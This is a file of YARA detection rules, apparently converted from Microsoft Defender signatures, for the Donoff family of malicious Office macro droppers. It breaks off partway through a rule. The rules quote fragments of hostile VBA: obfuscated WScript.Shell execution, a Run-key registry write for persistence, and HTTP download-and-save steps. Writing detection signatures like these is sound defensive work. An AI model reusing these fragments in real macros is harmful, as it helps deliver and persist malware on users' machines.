rule TrojanDropper_O97M_Donoff_2147707968_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff"
        threat_id = "2147707968"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"Wor\" & \"d.\" & \"Applicatio\"" ascii //weight: 1
        $x_1_2 = "& \".r\" & \"tf\"" ascii //weight: 1
        $x_1_3 = "= \"T\" & \"EM\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_2147707968_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff"
        threat_id = "2147707968"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Array(\"CM\", \"D.\", \"Ex\", \"e \", \"/c\", \" \"\"\", \"pO\", \"w" ascii //weight: 1
        $x_1_2 = "\"re\", \"ad\", \".p\", \"hp" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_2147707968_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff"
        threat_id = "2147707968"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Pa4R6RO/3CsmMbMO8YNL:" ascii //weight: 1
        $x_1_2 = "WKIARbEWSKHrAjRY" ascii //weight: 1
        $x_1_3 = "VUJLIAbLRLAPTDis" ascii //weight: 1
        $x_1_4 = "VlMgW2AoRCE99a" ascii //weight: 1
        $x_1_5 = "XdQEUFNUnFnnie2e5c" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDropper_O97M_Donoff_2147707968_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff"
        threat_id = "2147707968"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2c 20 2c 20 43 42 79 74 65 28 22 26 22 20 2b 20 43 68 72 28 03 00 20 2d 20 03 00 29 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {53 74 72 52 65 76 65 72 73 65 28 22 61 70 78 45 22 29 20 2b 20 4d 69 64 28 22 [0-16] 6e 64 45 6e 76 69 72 [0-16] 22 2c 20 02 00 2c 20 37 29 20 2b 20 22 6f 6e 6d 65 6e 74 53 74 72 69 6e 67 73 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_2147707968_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff"
        threat_id = "2147707968"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 75 6e 20 10 00 2c 20 28 28 10 00 20 (2b|2f|2a|2d) 20 10 00 29 20 (2b|2f|2a|2d) 20 28 10 00 20 (2b|2f|2a|2d) 20 10 00 29 29 2c 20 28 28 10 00 20 (2b|2f|2a|2d) 20 10 00 29 20 (2b|2f|2a|2d) 20 28 2d 10 00 20 (2b|2f|2a|2d) 20 10 00 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {29 20 2b 20 31 29 29 29 29 2c 20 28 28 10 00 20 (2b|2f|2a|2d) 20 10 00 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_2147707968_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff"
        threat_id = "2147707968"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {52 65 44 69 6d 20 [0-32] 28 28 28 28 55 42 6f 75 6e 64 28 [0-32] 29 20 2b 20 31 29 20 5c 20 [0-36] 29 20 2a 20 33 29 20 2d 20 31 29}  //weight: 3, accuracy: Low
        $x_1_2 = {3d 20 43 61 6c 6c 42 79 4e 61 6d 65 28 [0-32] 2c 20 22 47 65 74 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 22 2c 20}  //weight: 1, accuracy: Low
        $x_2_3 = {26 20 22 5c [0-32] 2e 65 78 65 22}  //weight: 2, accuracy: Low
        $x_2_4 = {2b 20 22 5c 22 20 2b 20 [0-54] 2e 65 (58|78) (45|65) 22}  //weight: 2, accuracy: Low
        $x_1_5 = {53 65 74 20 [0-32] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((1 of ($x_3_*) and 2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDropper_O97M_Donoff_2147707968_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff"
        threat_id = "2147707968"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 75 6e 20 10 00 2c 20 28 28 [0-1] 03 00 10 00 20 (2b|2f|2a|2d) 20 03 00 10 00 29 20 (2b|2a|2f|2d) 20 28 [0-1] 03 00 10 00 20 (2b|2a|2f|2d) 20 03 00 10 00 29 29 2c 20 28 28 [0-1] 03 00 10 00 20 (2b|2a|2f|2d) 20 03 00 10 00 29 20 (2b|2a|2f|2d) 20 28 [0-1] 03 00 10 00 20 (2b|2a|2f|2d) 20 03 00 10 00 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {29 20 2b 20 31 29 29 29 29 2c 20 28 28 [0-1] 03 00 10 00 20 (2b|2f|2a|2d) 20 03 00 08 00 29 29 29 03 00 10 00 20 3d 20 10 00 28 10 00 29 [0-48] 03 00 08 28 09 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_2147707968_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff"
        threat_id = "2147707968"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {29 29 29 29 29 29 0d 0a 4e 65 78 74 20 02 00 10 00 80 00 20 3d 20 02 00 10 00 28 02 00 10 00 28 00 10 00 29 2c 20 28 02 00 10 00 28 02 00 10 00 28 28 09 10 00 28 02 00 10 00 29 20 2b 20 09 10 00 28 02 00 10 00 29 29 2c 20 28 28 [0-4] 03 00 10 00 20 (2b|2a|2f|2d) 20 03 00 10 00 29}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 64 20 53 65 6c 65 63 74 0d 0a 45 6e 64 20 49 66 49 66 20 03 00 10 00 20 2b 20 03 00 10 00 20 3e 20 03 00 10 00 20 54 68 65 6e 20 03 10 00 20 3d 20 05 10 00 20 2d 20 01 10 00}  //weight: 1, accuracy: Low
        $x_1_3 = {29 20 2b 20 31 29 29 29 29 2c 20 28 28 [0-4] 03 00 10 00 20 (2b|2a|2f|2d) 20 03 00 10 00 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_ER_2147719549_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.ER"
        threat_id = "2147719549"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 52 75 6e 28 15 00 2c 20 15 00 29}  //weight: 1, accuracy: Low
        $x_2_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 4a 6f 69 6e 28 15 00 2c 20 22 22 29 29}  //weight: 2, accuracy: Low
        $x_2_3 = {46 6f 72 20 30 00 20 3d 20 31 20 54 6f 20 4c 65 6e 28 30 00 29 0d 0a [0-64] 0d 0a 44 69 6d 20 30 00 20 41 73 20 53 74 72 69 6e 67 [0-96] 0d 0a 44 69 6d 20 30 00 20 41 73 20 53 74 72 69 6e 67 [0-112] 3d 20 4d 69 64 28 01 2c 20 30 00 2c 20 31 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_AA_2147720273_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.AA"
        threat_id = "2147720273"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Lib \"ntdll.dll\" Alias \"NtAllocateVirtualMemory\"" ascii //weight: 1
        $x_1_2 = "Lib \"Ntdll.dll  \" Alias \"ZwWriteVirtualMemory\"" ascii //weight: 1
        $x_1_3 = "\"Shlwapi.dll\" Alias \"PathFileExists\"" ascii //weight: 1
        $x_1_4 = "\"Shell32.dll\" Alias \"SHChangeNotification_Lock\"" ascii //weight: 1
        $x_1_5 = "Lib \"Shell32.dll\" Alias \"SHGetDesktopFolder\"" ascii //weight: 1
        $x_1_6 = "Lib \"Shell32.dll\" Alias \"SHGetSettings" ascii //weight: 1
        $x_1_7 = "Lib \"Kernel32.dll\" Alias \"ReadConsoleW\"" ascii //weight: 1
        $x_1_8 = "Lib \"User32.dll\" Alias \"GrayStringA\"" ascii //weight: 1
        $x_1_9 = "#If Win64 Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_VZ_2147725994_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.VZ"
        threat_id = "2147725994"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = ".regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii //weight: 2
        $x_1_2 = "CreateObject(\"Wscript.Shell\")" ascii //weight: 1
        $x_1_3 = "OutUpdate" ascii //weight: 1
        $x_1_4 = ",WinCred" ascii //weight: 1
        $x_1_5 = "Mod &H100" ascii //weight: 1
        $x_1_6 = "+ &HA5" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_1_*))) or
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDropper_O97M_Donoff_C_2147742010_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.C"
        threat_id = "2147742010"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"Wsc\" & Chr(82) & \"ip\" & \"\" & \"t.sh\"" ascii //weight: 1
        $x_1_2 = {52 65 70 6c 61 63 65 28 [0-16] 2c 20 22 2e 64 6f 63 78 22 2c 20 22 2e 22 20 26 20 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_3 = "\"\\\\SPA-SERVER\\HP OfficeJet Pro L7700 Series\"" ascii //weight: 1
        $x_1_4 = {43 68 72 28 36 39 29 20 26 20 22 78 70 4c 6f 72 65 72 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 [0-16] 20 26 20 43 68 72 28 33 34 29}  //weight: 1, accuracy: Low
        $x_1_5 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 41 74 74 61 63 68 65 64 54 65 6d 70 6c 61 74 65 2e 50 61 74 68 20 26 20 22 5c [0-5] 2e 64 6f 63 78 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDropper_O97M_Donoff_D_2147742014_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.D"
        threat_id = "2147742014"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Application.StartupPath & \"\\\" & \"panda.\" & Chr(99 + 7) & Chr(99 + 16) & \"\" & \"e\"" ascii //weight: 1
        $x_1_2 = "Set up excluded words" ascii //weight: 1
        $x_1_3 = {52 69 67 68 74 28 22 [0-21] 22 2c 20 37 29 20 26 20 22 2e 22 20 26 20 4c 65 66 74 28 22 [0-21] 22 2c 20 35 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_E_2147742015_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.E"
        threat_id = "2147742015"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 70 6c 61 63 65 28 [0-16] 2c 20 22 64 6f 63 6d 22 2c 20 22 [0-16] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {22 53 68 22 20 26 20 43 68 72 28 [0-16] 29 20 26 20 22 6c 6c 22}  //weight: 1, accuracy: Low
        $x_1_3 = "\"E\" & \"xe\" & Chr(99) & \"ute\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_2147743144_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff!MSR"
        threat_id = "2147743144"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 69 6e 48 74 74 70 2e [0-18] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 [0-26] 22 29 2e 47 65 74 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 28 32 29 20 26 20 22 5c 72 75 6e 64 6c 6c 36 34 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_3 = "CreateObject(\"WScript.Shell\").Run" ascii //weight: 1
        $x_1_4 = "export=download&id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepH" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_2147743144_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff!MSR"
        threat_id = "2147743144"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = {4e 61 6d 65 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-9] 2e 64 6f 63 22 20 41 73 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-9] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = {45 6e 76 69 72 6f 6e 24 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 26 20 22 5c 41 70 70 44 61 74 61 5c 52 6f 61 6d 69 6e 67 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c [0-6] 2e 75 72 6c 22}  //weight: 1, accuracy: Low
        $x_1_4 = {53 65 74 20 6f 53 68 6f 72 74 63 75 74 20 3d 20 [0-4] 2e 43 72 65 61 74 65 53 68 6f 72 74 63 75 74 28 [0-22] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_QC_2147744250_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.QC!MSR"
        threat_id = "2147744250"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "+ \".d\" + \"ll\"" ascii //weight: 1
        $x_1_2 = "KillArray ZipFolder & \"\\ole\" + \"Obj\" + \"ect*.bin\"" ascii //weight: 1
        $x_1_3 = ".Item(\"xl\\embeddings\\oleObject1" ascii //weight: 1
        $x_1_4 = ".Namespace(ZipFolder).CopyHere" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_F_2147745052_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.F!MSR"
        threat_id = "2147745052"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"Ms\" & \"xml2\" & \".DO\" & \"MDoc\" & \"um\" & \"ent\").createElement(\"b\" & \"as\" & \"e6\" & \"4\")" ascii //weight: 1
        $x_1_2 = "\"bi\" & \"n.ba\" & \"se6\" & \"4\"" ascii //weight: 1
        $x_1_3 = "\"%lo\" & \"ca\" & \"la\" & \"ppda\" & \"ta%\"" ascii //weight: 1
        $x_1_4 = "\"\\as\" & \"semb\" & \"ly\\tmp\\NVC\" & \"A5R\" & \"DR\\\"" ascii //weight: 1
        $x_1_5 = {67 65 74 45 6e 76 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDropper_O97M_Donoff_QD_2147745412_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.QD!MSR"
        threat_id = "2147745412"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(\"C###:\\###Win###do###ws\\###Micr###osof###t.NET\\Fr###amewo###rk\\\", \"###\", \"\")" ascii //weight: 1
        $x_1_2 = "Replace(\"\\###ms###bu###ild.###exe\", \"###\", \"\")" ascii //weight: 1
        $x_1_3 = "Replace(\"U###SE###RP###ROF###ILE\", \"###\", \"\")) & \"\\\" & Replace(\"D###ow###nl###oa###ds\", \"###\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_AD_2147745444_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.AD!MSR"
        threat_id = "2147745444"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-6] 2b 20 22 57 22 20 2b 20 [0-6] 2b 20 22 53 63 22 20 26 20 [0-6] 26 20 22 72 69 70 22 20 26 20 22 74 2e 22 20 26 20 47 62 6f 6f 70 6c 72 29}  //weight: 1, accuracy: Low
        $x_2_2 = {20 3d 20 49 6e 6d 20 26 20 [0-6] 26 20 22 5c 48 69 67 68 53 6b 79 22 20 26 20}  //weight: 2, accuracy: Low
        $x_2_3 = {20 3d 20 22 22 20 26 20 48 6f 6f 6c 6f 72 74 67 20 26 20 [0-6] 26 20 22 5c 63 6c 6f 75 64 2e 22 20 26 20 [0-6] 26 20 22 6a 22 20 26 20 [0-6] 26 20 22 73 22 20 26 20 22 22 20 26 20 22 65 22}  //weight: 2, accuracy: Low
        $x_1_4 = " = \"\" & \"s\" & \"\" & \"h\" & \"\" & \"\" & \"el\" & \"l\" & " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDropper_O97M_Donoff_CS_2147749189_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.CS!eml"
        threat_id = "2147749189"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "MsgBox (\"Document decrypt error.\")" ascii //weight: 1
        $x_1_2 = ".Find.Execute Replace:=wdReplaceAll" ascii //weight: 1
        $x_1_3 = {46 69 6c 65 43 6f 70 79 20 4a 6f 69 6e 28 [0-12] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 20 4a 6f 69 6e 28 [0-13] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "valueOne = \"THIS IS THE PRODUCT\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_PS_2147751642_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.PS!MTB"
        threat_id = "2147751642"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "invoice = CreateObject(\"scripting.filesystemobject\")" ascii //weight: 1
        $x_1_2 = {73 74 72 73 61 76 65 74 6f 20 3d 20 69 6e 76 6f 69 63 65 20 26 20 22 [0-240] 2e 6a 73 22}  //weight: 1, accuracy: Low
        $x_1_3 = {73 74 72 6c 69 6e 6b 20 3d 20 22 68 74 74 70 73 3a 2f 2f [0-20] 2e 63 6f 6d 2f [0-9] 2e 70 68 70 22}  //weight: 1, accuracy: Low
        $x_1_4 = "Set objhttpinvoice = CreateObject(\"msxml2.xmlhttp\")" ascii //weight: 1
        $x_1_5 = "objhttpinvoice.Open \"get\", strlink, False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_AJK_2147751864_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.AJK!MSR"
        threat_id = "2147751864"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"c:\\netstats\\\" & \"PressTableList\" & \".jse\"" ascii //weight: 1
        $x_1_2 = "\"c:\\netstats\\\" & \"PressTableList\" & \".cmd\"" ascii //weight: 1
        $x_1_3 = "\"cscript //nologo \" + Filename" ascii //weight: 1
        $x_1_4 = "strParh = \"c:\\netstats\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_AA_2147753344_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.AA!MSR"
        threat_id = "2147753344"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {42 65 64 61 73 6f 6c 20 3d 20 [0-9] 20 26 20 22 53 68 22 20 26 20 00 20 26 20 22 65 6c 6c 22 0d 0a [0-10] 20 3d 20 00 20 26 20 22 52 75 22 20 26 20 00 20 26 20 22 6e 22}  //weight: 2, accuracy: Low
        $x_3_2 = {20 3d 20 73 77 77 20 26 20 72 66 20 26 20 22 61 6e 67 75 6c 61 72 2d 39 2e 32 2e 30 22 20 26 20 [0-9] 20 26 20 22 2e 73 6f 75 72 63 65 22}  //weight: 3, accuracy: Low
        $x_1_3 = {2c 20 22 2e 73 6f 75 72 63 65 22 2c 20 22 2e 22 20 26 20 [0-9] 20 26 20 4e 69 6b 66 63 20 26 20 00 20 26 20 22 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDropper_O97M_Donoff_PXK_2147757773_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.PXK!MTB"
        threat_id = "2147757773"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {5c 63 61 6c 63 2e 65 78 65 32 00 74 65 73 74 31 3d 73 68 65 6c 6c 28 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32}  //weight: 1, accuracy: Low
        $x_1_2 = {5c 6d 73 70 61 69 6e 74 2e 65 78 65 32 00 3d 73 68 65 6c 6c 28 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32}  //weight: 1, accuracy: Low
        $x_1_3 = "=environ(\"userprofile\")&\"\\desktop\"&\"\\iamhere.txt" ascii //weight: 1
        $x_1_4 = "iamwatchingyou...anytime,anywhere" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_PK_2147779248_0
{
    meta:
        author = "defender2yara"
